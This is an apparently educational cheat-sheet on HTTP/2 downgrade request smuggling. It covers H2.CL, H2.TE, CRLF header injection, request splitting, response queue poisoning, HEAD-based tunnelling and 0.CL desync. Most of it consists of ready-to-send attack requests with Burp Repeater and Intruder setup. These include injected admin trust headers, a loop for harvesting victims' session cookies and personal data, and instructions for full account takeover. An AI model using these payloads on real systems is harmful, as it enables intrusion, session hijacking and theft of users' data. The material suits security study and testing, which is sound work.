# Advanced HTTP Request Smuggling

Classic CL.TE and TE.CL attacks require the back-end to support HTTP/1.1 and for both servers to disagree on a body-length header. HTTP/2 was designed to eliminate this ambiguity entirely — but in practice, the near-universal deployment pattern of an HTTP/2 front-end sitting in front of HTTP/1.1 back-end infrastructure creates an entirely new attack surface. The front-end must translate HTTP/2 binary frames back into HTTP/1.1 text for the back-end, and every transformation in that translation is a potential injection point — especially because HTTP/2's binary header encoding means that `\r\n` inside a header value is just data, not a delimiter, until it reaches the HTTP/1.1 back-end where it suddenly becomes one. 

**Fundamental principle: HTTP/2 downgrading reintroduces the same front-end/back-end ambiguity that HTTP/2 was designed to remove. An attacker with control over any header value in an HTTP/2 request can inject content that is invisible and harmless to the HTTP/2 front-end but is interpreted as structural HTTP/1.1 syntax — new headers, request terminators, or entire second requests — by the HTTP/1.1 back-end.**

***

## Architecture: What HTTP/2 Downgrading Actually Does

```
HTTP/2 binary wire format (what actually travels over TLS):
─────────────────────────────────────────────────────────────────────────────
HTTP/2 Frame:
  ┌──────────────────────────────────────────────┐
  │ Length (24 bits) │ Type (8) │ Flags (8) │ ... │
  │ Payload (variable, length = Length field)    │
  └──────────────────────────────────────────────┘

Headers frame (HEADERS):
  HPACK-compressed header block:
  :method = POST
  :path   = /example
  :authority = vulnerable-website.com
  content-type = application/x-www-form-urlencoded
  content-length = 0          ← attacker can inject this!

DATA frame(s):
  GET /admin HTTP/1.1\r\nHost: vulnerable-website.com\r\nContent-Length: 10\r\n\r\nx=1

No ambiguity in HTTP/2: frame lengths are explicit, binary, non-spoofable.
→ Front-end knows exact boundary. No CL/TE conflict possible in HTTP/2.


Front-end DOWNGRADING to HTTP/1.1 (where the vulnerability is reintroduced):
─────────────────────────────────────────────────────────────────────────────

HTTP/2 request received by front-end:
  :method → POST
  :path   → /example
  :authority → vulnerable-website.com
  content-type → application/x-www-form-urlencoded
  content-length → 0                         ← ATTACKER INJECTED (should be body length)
  [DATA frame body] → GET /admin HTTP/1.1\r\nHost: ...\r\nContent-Length: 10\r\n\r\nx=1

Front-end translates to HTTP/1.1:
  POST /example HTTP/1.1
  Host: vulnerable-website.com               ← :authority → Host
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 0                          ← reused from attacker's injected value ✓
                                             ← (not recalculated from actual data frame size)
  GET /admin HTTP/1.1
  Host: vulnerable-website.com
  Content-Length: 10

  x=1GET / H                                 ← next request bytes absorbed

Back-end HTTP/1.1 receives:
  Request 1: POST /example (Content-Length: 0 → body = 0 bytes)
  Request 2: starts at "GET /admin HTTP/1.1..." ← smuggled ✓

Key translation steps that introduce vulnerability:
  1. :method → first line method
  2. :path   → first line path
  3. :authority → Host header
  4. Remaining headers → HTTP/1.1 headers (ORDER PRESERVED)
  5. DATA frames → body (sent verbatim)
  6. Content-Length: derived from DATA frame size OR reused from injected header ← FLAW
```

***

## H2.CL: Injecting a False Content-Length

```http
# ── WHAT MAKES THIS WORK ──────────────────────────────────────────────────────
# HTTP/2 spec: if content-length header is present, it MUST match frame length.
# Real-world front-ends: often reuse the injected content-length WITHOUT validating
# that it matches the actual DATA frame payload length.
#
# Attacker injects content-length: 0 in HTTP/2 headers.
# DATA frame contains the actual smuggled request body.
# Front-end passes injected content-length: 0 to HTTP/1.1 back-end.
# Back-end (CL): reads 0 bytes of body → the entire DATA frame contents
# remain in the receive buffer → treated as start of next request. ✓

# ── BURP REPEATER SETUP ───────────────────────────────────────────────────────
# 1. Inspector panel → Request attributes → Protocol: HTTP/2
# 2. Repeater menu → uncheck "Update Content-Length"
# 3. If target doesn't advertise HTTP/2 via ALPN:
#    Settings → Tools → Repeater → Connections → enable "Allow HTTP/2 ALPN override"
#    Then set Protocol to HTTP/2 in Inspector panel

# ── ATTACK REQUEST (displayed in Burp's HTTP/2 Inspector format) ───────────────

:method     POST
:path       /example
:authority  vulnerable-website.com
content-type   application/x-www-form-urlencoded
content-length 0                     ← injected: tells HTTP/1.1 back-end body = 0 bytes

GET /admin HTTP/1.1                  ← DATA frame body — invisible to front-end parsing
Host: vulnerable-website.com         ← smuggled to back-end as next request ✓
Content-Length: 10

x=1

# ── WHAT THE HTTP/1.1 BACK-END RECEIVES ───────────────────────────────────────
#
# POST /example HTTP/1.1
# Host: vulnerable-website.com
# Content-Type: application/x-www-form-urlencoded
# Content-Length: 0              ← back-end reads 0 bytes of body → stops here
#                                ← remaining bytes enter the back-end buffer:
# GET /admin HTTP/1.1
# Host: vulnerable-website.com
# Content-Length: 10
#
# x=1[VICTIM'S REQUEST BYTES]    ← next arriving request absorbed here ✓

# ── ESCALATION: Access /admin panel ───────────────────────────────────────────
# Send a normal follow-up request:
GET / HTTP/1.1
Host: vulnerable-website.com
# → Back-end processes: GET /admin HTTP/1.1 with CL: 10
#                       x=1GET / H (absorbs 10 bytes of normal request)
# → Returns: 200 OK with admin panel ✓

# ── H2.CL BODY SIZING GUIDE ───────────────────────────────────────────────────
# content-length: 0 → back-end reads 0 body bytes → entire DATA frame = buffer
# content-length: 5 → back-end reads 5 bytes, then remaining bytes = buffer
# Use 0 for cleanest exploit when you want the entire DATA frame smuggled
```

***

## H2.TE: Injecting a Chunked Transfer-Encoding Header

```http
# ── WHAT MAKES THIS WORK ──────────────────────────────────────────────────────
# HTTP/2 spec: Transfer-Encoding is forbidden in HTTP/2 headers.
# Front-ends SHOULD strip any TE header before downgrading. Many don't.
# HTTP/1.1 back-end receives TE: chunked → processes body as chunked.
# "0\r\n\r\n" in the DATA frame = zero-length chunk = end of chunked body.
# Everything after "0\r\n\r\n" = left in buffer → next request. ✓

# ── ATTACK REQUEST ────────────────────────────────────────────────────────────

:method     POST
:path       /example
:authority  vulnerable-website.com
content-type   application/x-www-form-urlencoded
transfer-encoding  chunked              ← injected TE header (forbidden in HTTP/2)

0                                        ← chunk terminator in DATA frame
                                         ← back-end (TE: chunked) stops here ✓
GET /admin HTTP/1.1                      ← left in back-end buffer ✓
Host: vulnerable-website.com
Foo: bar

# ── WHAT THE HTTP/1.1 BACK-END RECEIVES ───────────────────────────────────────
#
# POST /example HTTP/1.1
# Host: vulnerable-website.com
# Content-Type: application/x-www-form-urlencoded
# Transfer-Encoding: chunked         ← passed through from HTTP/2 headers
#
# 0                                  ← chunk "0" = end of chunked body
#                                    ← back-end terminates request 1 here
# GET /admin HTTP/1.1                ← smuggled into buffer as request 2 ✓
# Host: vulnerable-website.com
# Foo: bar

# ── DETECTING HIDDEN HTTP/2 SUPPORT ──────────────────────────────────────────
# Some servers support HTTP/2 but fail to advertise it via ALPN.
# Burp defaults to HTTP/1.1 for such servers → attack surface missed.
#
# Force HTTP/2 in Burp:
# Settings → Tools → Repeater → Connections → ✓ Allow HTTP/2 ALPN override
# Inspector panel → Request attributes → Protocol → HTTP/2
# Send the H2.CL probe with content-length: 0
# If you get a different response than with HTTP/1.1 → hidden HTTP/2 support ✓

# ── H2.TE VS H2.CL: WHEN TO USE WHICH ────────────────────────────────────────
# H2.CL:  Front-end reuses attacker's content-length (doesn't recalculate from DATA frame)
#          → Works even when front-end strips TE headers (as required by spec)
#
# H2.TE:  Front-end fails to strip TE: chunked before downgrading
#          → Works even when front-end recalculates content-length correctly
#          → More widely applicable since many proxies don't validate TE
#
# Test both: if one is blocked (by a WAF or spec-compliant front-end), try the other
```

***

## CRLF Injection: Bypassing H2.CL and H2.TE Defences

When a front-end validates `content-length` and strips `transfer-encoding`, CRLF injection provides an alternative path — hiding forbidden HTTP/1.1 structural characters inside HTTP/2 header values where they are invisible to HTTP/2 parsers but structural to HTTP/1.1 back-ends. 

```http
# ── WHY CRLF WORKS IN HTTP/2 BUT NOT HTTP/1.1 ────────────────────────────────
#
# HTTP/1.1 header parsing:
#   "foo: bar\r\nTransfer-Encoding: chunked"
#   → Parser sees CRLF → ENDS "foo: bar" header → STARTS "Transfer-Encoding: chunked"
#   → Front-end immediately sees two separate headers → can strip/block TE header
#
# HTTP/2 header parsing (HPACK compressed binary):
#   Header name  = "foo"
#   Header value = "bar\r\nTransfer-Encoding: chunked"   ← CRLF is JUST DATA here
#   → No structural significance in HTTP/2 binary encoding
#   → Front-end sees ONE header: foo = "bar\r\nTransfer-Encoding: chunked"
#   → TE header is hidden from HTTP/2 parser → not detected, not stripped ✓
#
# HTTP/1.1 downgrade of this header:
#   foo: bar\r\n                    ← "\r\n" is now a DELIMITER
#   Transfer-Encoding: chunked      ← injected header materialises ✓
#   Back-end sees: legitimate TE: chunked header → processes body as chunked

# ── BURP REPEATER: HOW TO INJECT CRLF IN AN HTTP/2 HEADER VALUE ──────────────
# In the Inspector panel (NOT the raw request editor):
# 1. Click the "+" button to add a custom header
# 2. Name: foo
# 3. Value: bar     (DO NOT type \r\n literally — use Shift+Enter or a special char)
#    In Burp Pro: in the header value field, press Shift+Enter to insert a literal CRLF
#    Type: bar, then Shift+Enter, then: Transfer-Encoding: chunked
# The Inspector shows the CRLF as a newline in the header value
# Burp encodes it correctly in the HTTP/2 HPACK binary stream ✓

# ── ATTACK: H2.TE via CRLF injection ──────────────────────────────────────────
# (Front-end strips standalone transfer-encoding header, but misses CRLF-injected one)

:method     POST
:path       /
:authority  vulnerable-website.com
content-type   application/x-www-form-urlencoded
foo         bar\r\n                    ← CRLF injected in value (use Burp Inspector)
            Transfer-Encoding: chunked ← this line appears as continuation in HTTP/2
                                         but becomes a separate header in HTTP/1.1

0                                      ← chunk terminator in body
                                       ← back-end (TE: chunked) terminates request here
GET /admin HTTP/1.1                    ← left in buffer ✓
Host: vulnerable-website.com

# ── WHAT HTTP/1.1 BACK-END RECEIVES AFTER DOWNGRADE ──────────────────────────
#
# POST / HTTP/1.1
# Host: vulnerable-website.com
# Content-Type: application/x-www-form-urlencoded
# foo: bar                            ← first part of foo's value
# Transfer-Encoding: chunked          ← materialised from CRLF injection ✓
#
# 0                                   ← chunk "0" = end of body
#
# GET /admin HTTP/1.1                 ← smuggled prefix in buffer ✓
# Host: vulnerable-website.com
```

***

## HTTP/2 Request Splitting: Injecting a Complete Second Request in Headers

CRLF injection can be used to split the request entirely at the header level rather than the body, enabling smuggling via GET requests (no body required) and bypassing `content-length` validation. 

```http
# ── CONCEPT: Split in headers, not body ───────────────────────────────────────
# Instead of terminating one request in the body (via chunk "0" or CL discrepancy),
# inject a complete HTTP/1.1 request terminator (\r\n\r\n) INTO a header value.
# The front-end appends \r\n\r\n to the end of all headers during downgrading.
# This, combined with the injected CRLF, creates two complete requests on the back-end.

# ── ATTACK: Request splitting via GET (no body needed) ────────────────────────

:method     GET
:path       /
:authority  vulnerable-website.com
foo         bar\r\n                          ← CRLF (use Burp Inspector Shift+Enter)
            \r\n                             ← second CRLF = end of first request headers
            GET /admin HTTP/1.1\r\n          ← start of second request
            Host: vulnerable-website.com    ← Host for second request

# ── WHAT HTTP/1.1 BACK-END RECEIVES AFTER DOWNGRADE ──────────────────────────
#
# GET / HTTP/1.1
# Host: vulnerable-website.com             ← added by front-end from :authority
# foo: bar                                 ← first part of foo value
#                                          ← \r\n\r\n = END of first request headers ✓
#                                          ← no body needed (GET request)
# GET /admin HTTP/1.1                      ← second request starts ✓
# Host: vulnerable-website.com
#
# PLUS: front-end adds its own \r\n\r\n at end of headers during downgrading
# → This ensures the first request is properly terminated even without explicit body

# ── PROBLEM: Host header positioning ─────────────────────────────────────────
# Front-end strips :authority and adds a new Host header at the END of headers.
# If Host is added AFTER the injected split point, first request has no Host:
#
# Broken layout:
# GET / HTTP/1.1
# foo: bar                    ← injected split point here
#                             ← first request ends with NO Host header
# GET /admin HTTP/1.1
# Host: vulnerable-website.com  ← this Host belongs to second request only
# Host: vulnerable-website.com  ← front-end appended ANOTHER Host here (to second req)
#
# RESULT: back-end rejects first request (missing Host) → exploit fails

# ── FIX: Position injected Host BEFORE the split point ────────────────────────

:method     GET
:path       /
:authority  vulnerable-website.com
foo         bar\r\n
            Host: vulnerable-website.com\r\n  ← inject Host for first request
            \r\n                              ← end of first request headers
            GET /admin HTTP/1.1              ← second request start

# HTTP/1.1 back-end receives:
# GET / HTTP/1.1
# foo: bar
# Host: vulnerable-website.com              ← injected Host ✓ (first request has Host)
#                                           ← \r\n\r\n = end of first request
# GET /admin HTTP/1.1                       ← second request ✓
# Host: vulnerable-website.com              ← Host added by front-end's :authority translation
# → Both requests valid ✓ → back-end processes GET /admin ✓


# ── VARIANT: Injecting internal trust headers ─────────────────────────────────
# If front-end adds X-Internal-User-ID based on session, you need it in BOTH requests.
# Front-end adds it AFTER :authority-derived Host (at end of headers).
# Position your injected version in the first request:

:method     GET
:path       /
:authority  vulnerable-website.com
foo         bar\r\n
            Host: vulnerable-website.com\r\n
            X-Internal-User-ID: 1\r\n        ← inject admin user ID for first request
            \r\n
            GET /admin HTTP/1.1\r\n
            X-Internal-User-ID: 1            ← also in second request ✓
```

***

## Response Queue Poisoning: Full-Site Takeover

Response queue poisoning goes further than smuggling a request prefix — it smuggles a *complete, standalone request* that generates its own response from the back-end. The front-end then maps that extra response to the wrong user, and every subsequent response on the connection is offset by one. 

```http
# ── HOW THE RESPONSE QUEUE DESYNCHRONISES ─────────────────────────────────────
#
# Normal operation (no attack):
#   Front-end receives Request A, forwards to back-end, gets Response A, returns to user.
#   Front-end receives Request B, forwards to back-end, gets Response B, returns to user.
#
# After response queue poisoning:
#   Front-end receives "Wrapper" request, forwards to back-end.
#   Back-end processes: Wrapper request (Response 1) + Smuggled request (Response 2)
#   Back-end sends Response 1 + Response 2 in sequence on the same connection.
#   Front-end receives Response 1 → maps to Wrapper → forwards to attacker. ✓
#   Response 2 sits in the queue on the front-end/back-end connection.
#   Front-end receives User B's request → forwards to back-end → gets Response B.
#   Front-end queue: [Response 2 (smuggled), Response B]
#   Front-end maps Response 2 → sends to User B ← WRONG RESPONSE ✓ (queue shifted)
#   Response B sits in queue.
#   Front-end receives Attacker's next request → gets Response B (User B's data) ✓
#   → Attacker receives arbitrary user's response ✓

# ── REQUIREMENTS ─────────────────────────────────────────────────────────────
# 1. Same TCP connection reused between front-end and back-end for multiple requests
# 2. Smuggled request must be COMPLETE (generates its own response from back-end)
# 3. Neither server closes the TCP connection due to the injected request
#    → Keep the smuggled request valid (real path, valid headers) to avoid 400/500 errors
#    → Use a path that reliably returns 302 or 404 (not 400, which may close connection)
# 4. Attacker can send arbitrary follow-up requests rapidly

# ── H2.TE RESPONSE QUEUE POISONING ATTACK ────────────────────────────────────

# Attack request (HTTP/2, injected TE via CRLF):
:method     POST
:path       /
:authority  vulnerable-website.com
content-type   application/x-www-form-urlencoded
foo         bar\r\n
            Transfer-Encoding: chunked

0\r\n
\r\n
GET /404-non-existent HTTP/1.1\r\n   ← smuggled COMPLETE request (expect 404 response)
Host: vulnerable-website.com\r\n
\r\n

# ── WHAT THE BACK-END PROCESSES ───────────────────────────────────────────────
#
# Request 1: POST /           → Response 1: 200 OK (attacker receives this)
# Request 2: GET /404-non-existent → Response 2: 404 Not Found (queued ← EXTRA)
#
# Front-end response queue:
# [Response 1 → attacker]     ← forwarded immediately, queue is now clean
# [Response 2 → QUEUED]       ← no request to match it to... yet

# ── CAPTURING VICTIM RESPONSES ────────────────────────────────────────────────
# Step 1: Send the attack request (receive Response 1 = 200 OK for POST /)
# Step 2: Immediately send a normal request to consume Response 2 from the queue
#         If the queue contains the 404 from the smuggled GET → receive 404 = timing confirmed
# Step 3: Keep repeating; any time you receive a non-404 response from your normal request
#         → that response was intended for a real user → contains their session data ✓

# Automated loop with Burp Intruder:
# Attack request: the smuggling POST above (single payload, no position markers)
# Normal request: GET / HTTP/1.1 (any innocuous request)
# Strategy: Sniper, NULL payloads, 100 repetitions
# Grep match: "Set-Cookie", "session=", "Your account", "private", admin-specific content

# ── READING STOLEN RESPONSES ──────────────────────────────────────────────────
# Captured victim response may contain:
#   HTTP/1.1 302 Found
#   Location: /my-account
#   Set-Cookie: session=VICTIM_SESSION_TOKEN     ← captured! ✓
#
#   HTTP/1.1 200 OK
#   Content-Type: text/html
#   <h1>Your account</h1>
#   <p>Email: victim@example.com</p>             ← PII captured ✓
#   <p>API key: abc123xyz</p>                    ← credentials captured ✓
#
# Use VICTIM_SESSION_TOKEN to log in as victim → full account takeover ✓

# ── STABILISING THE ATTACK (avoid connection closure) ────────────────────────
# Smuggled request MUST be a valid HTTP/1.1 request:
# → Use a real path (even if it returns 404, keep the request syntactically valid)
# → Include Host header ✓
# → Do NOT use invalid method or malformed headers
# → Avoid including a body in the smuggled GET (some servers close on unexpected body)
# → Keep Content-Length of smuggled request accurate

# If back-end closes connection after each poisoning attempt:
# → Connection reuse was broken → try different approach (request tunnelling)
# → Or: include Connection: keep-alive in smuggled request headers
```

***

## HTTP Request Tunnelling: Smuggling Without Connection Reuse

When the front-end creates a new connection per request (no connection reuse), the response queue attacks above are impossible. Tunnelling provides a way to still hide a second request by exploiting HTTP/2 pseudo-header injection — specifically HEAD response mechanics — to extract internal headers or exfiltrate data even from non-persistent connections. 

```http
# ── CONCEPT: Tunnel a hidden request inside a visible one ─────────────────────
# Even with no connection reuse, a single HTTP/2 request can be downgraded into
# TWO HTTP/1.1 requests. The back-end responds to both; the front-end forwards
# only the first response to the attacker; the second response "leaks" into the
# body of the first response if the first request was a HEAD request.

# ── HEAD TRICK: Leak internal headers via non-blind tunnelling ─────────────────
# HEAD method: back-end returns headers-only response (no body), BUT includes
# Content-Length indicating how large the body WOULD be.
# Front-end: forwards the HEAD response back to attacker (headers only, no body).
# BUT: the back-end also processed the TUNNELLED second request and sent its response.
# The front-end uses HEAD response's Content-Length to decide how many bytes to read.
# If Content-Length (from HEAD) > 0 → front-end reads that many bytes from the connection.
# Those bytes ARE the second request's response → leaked to attacker ✓

# ── SETUP IN BURP REPEATER ────────────────────────────────────────────────────
# Inspector panel → Protocol: HTTP/2
# Method: HEAD (critical — triggers the Content-Length mismatch)
# Body: inject the tunnelled second request using CRLF in a header value

:method     HEAD
:path       /
:authority  vulnerable-website.com
foo         bar\r\n
            \r\n
            GET /admin HTTP/1.1\r\n
            Host: vulnerable-website.com\r\n
            X-SSL-CLIENT-CN: administrator\r\n
            \r\n

# ── WHAT BACK-END PROCESSES ───────────────────────────────────────────────────
#
# Request 1: HEAD /
# Response 1 (headers only):
#   HTTP/1.1 200 OK
#   Content-Length: 4096       ← indicates body WOULD be 4096 bytes
#   [no body — it's HEAD]
#
# Request 2: GET /admin (with injected X-SSL-CLIENT-CN: administrator)
# Response 2 (body present):
#   HTTP/1.1 200 OK
#   Content-Type: text/html
#   Content-Length: 4096
#   [ADMIN PANEL HTML - 4096 bytes]
#
# Front-end reads Response 1 headers + reads 4096 more bytes (Content-Length from HEAD)
# Those 4096 bytes = Response 2's body = admin panel HTML
# Attacker receives: HEAD response headers + admin panel body ✓
# Hidden from front-end: the second GET /admin request and its headers
# → Front-end security controls never saw GET /admin ✓ → bypass achieved

# ── NON-BLIND TUNNELLING: LEAKING INTERNAL HEADERS ────────────────────────────
# Use a reflection gadget (like /login with email= parameter) as the tunnelled request.
# The HEAD response's Content-Length determines how much of the POST /login response
# gets forwarded as "body" to the attacker.

:method     HEAD
:path       /
:authority  vulnerable-website.com
foo         bar\r\n
            \r\n
            POST /login HTTP/1.1\r\n
            Host: vulnerable-website.com\r\n
            Content-Type: application/x-www-form-urlencoded\r\n
            Content-Length: 9\r\n
            \r\n
            email=x

# Response to HEAD / contains Content-Length matching the POST /login response size.
# Attacker reads that many bytes from the stream → receives POST /login response body.
# If /login reflects back request headers (as shown in the "revealing front-end rewriting"
# exploit): attacker receives all internal headers injected by the front-end ✓
# e.g.: X-Internal-User-ID, X-SSL-CLIENT-CN, X-Forwarded-For, TLS metadata headers
```

***

## 0.CL Desync (Emerging Technique)

```http
# ── WHAT IS 0.CL DESYNC? ──────────────────────────────────────────────────────
# Scenario: Front-end IGNORES Content-Length header (treats every body as empty).
# Back-end HONOURS Content-Length (reads body as specified).
# Traditional problem: if front-end ignores CL and sends only the "empty body" request,
# the back-end receives a CL-specified body and waits for bytes that never come.
# → Both servers deadlock: front-end waiting for next request, back-end waiting for body.
# → Long considered unexploitable for this reason.
#
# Breakthrough (2024, PortSwigger HTTP/1.1 Must Die research):
# "Early response gadget": a server-side behaviour that causes the back-end to respond
# BEFORE receiving the complete request body (e.g., on input validation error).
# This breaks the deadlock: back-end sends error response immediately.
# The attacker can then use a "double desync" technique to chain two desyncs
# and construct a full exploit from what was previously a dead end.

# ── EARLY RESPONSE GADGET EXAMPLE ────────────────────────────────────────────
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30

x=<script>             ← input validation triggers immediate 400 error BEFORE reading rest

# Back-end responds IMMEDIATELY with:
# HTTP/1.1 400 Bad Request
# "Malicious input detected"
# → Body never fully read → deadlock broken ✓

# ── IDENTIFYING EARLY RESPONSE GADGETS ────────────────────────────────────────
# Test: send requests with Content-Length larger than actual body to various endpoints.
# If you receive an immediate response (not a timeout) → endpoint reads partial body
# and responds early → potential early response gadget ✓
# Common triggers: WAF input validation, CSP violation endpoints, malformed JSON parsers

# Full 0.CL exploit chain: see "HTTP/1.1 Must Die" whitepaper (PortSwigger Research 2024)
```
